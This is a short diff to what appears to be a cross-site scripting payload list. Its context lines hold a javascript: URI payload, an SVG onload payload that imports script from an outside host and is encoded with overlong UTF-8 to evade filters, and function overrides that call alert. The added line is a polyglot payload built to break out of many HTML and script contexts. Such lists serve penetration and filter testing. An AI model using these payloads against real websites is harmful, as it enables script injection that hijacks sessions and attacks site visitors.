@@ -32,3 +32,4 @@ JavaScript://%250Aalert?.(1)//
 <Svg OnLoad=import('//X55.is')>%C0%BCSvg%C0%A0OnLoad%C0%BDimport%C0%A8%C0%A7%C0%AF%C0%http://AFX55.is%C0%A7%C0%A9%C0%BE
 function/**/Date(){alert(1)}
 function/**/RegExp(){alert(1)}
+/*-/*`/*\`/*'/*"/**/(/**/oNclick=alert())//%0D%0A%0D%0a//</style/</title/</textarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
